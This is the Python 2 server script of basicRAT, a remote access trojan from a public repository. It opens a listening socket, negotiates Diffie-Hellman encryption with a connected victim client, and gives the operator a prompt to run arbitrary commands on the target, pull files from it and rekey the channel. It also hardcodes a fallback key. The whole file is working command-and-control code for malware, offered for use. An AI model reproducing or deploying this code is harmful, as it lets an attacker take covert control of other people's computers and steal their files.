#!/usr/bin/env python
# -*- coding: utf-8 -*-

import readline
import time

from basicRAT import *

# ascii banner (Crawford2) - http://patorjk.com/software/taag/
# ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
BANNER = '''
 ____    ____  _____ ____   __  ____    ____  ______      .  ,
|    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
|  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
|     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
|  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
|     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
|_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
         https://github.com/vesche/basicRAT
'''
HELP_TEXT = '''
download <file> - Download a file.
help            - Show this help menu.
run <command>   - Execute a command on the target.
upload <file>   - Upload a file.
quit            - Gracefully kill client and server.
'''
HOST = 'localhost'
FALLBACK_KEY  = '82e672ae054aa4de6f042c888111686a'
# generate your own key with...
# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.bind((HOST, PORT))
    except socket.error:
        print 'Error: Unable to start server, port {} in use?'.format(PORT)
        sys.exit(1)

    for line in BANNER.split('\n'):
        time.sleep(0.05)
        print line

    print 'basicRAT server listening on port {}...\n'.format(PORT)

    s.listen(10)
    conn, addr = s.accept()
    DHKEY = diffiehellman(conn, server=True)
    #print binascii.hexlify(DHKEY) #debug: confirm DHKEY matches
    
    while True:
        prompt = raw_input('[{0}] basicRAT> '.format(addr[0])).rstrip().split()

        # allow noop
        if prompt == []:
            continue

        # seperate prompt into command and action
        cmd, action = prompt[0], ' '.join(prompt[1:])

        # allow no action
        if action == []:
            action = ''

        # display help text
        if cmd == 'help':
            print HELP_TEXT
            continue

        # send data to client
        data = '{} {}'.format(cmd, action).rstrip()
        conn.send(encrypt(data, DHKEY))

        # stop server
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        # results of command
        elif cmd == 'run':
            recv_data = conn.recv(4096)
            print decrypt(recv_data, DHKEY)

        # download a file
        elif cmd == 'download':
            f_name = action.split()[0]

            with open(f_name, 'wb') as f:
                while True:
                    recv_data = conn.recv(1024)
                    if not recv_data:
                        break
                    f.write(decrypt(recv_data, DHKEY))
                    
        # regenerate DH key (dangerous! may cause connection loss)
        # available in case a fallback occurs or you suspect evesdropping
        elif cmd == 'rekey':
            DHKEY = diffiehellman(conn, server=True)
            #print binascii.hexlify(DHKEY) #debug
            
        else:
            print "Invalid command"
            print "Type 'help' to get a list of all commands"


if __name__ == '__main__':
    try:
        PORT = int(sys.argv[1])
    except (IndexError, ValueError):
        print 'Usage: ./basicRAT_server.py <port>'
        sys.exit(1)

    main()
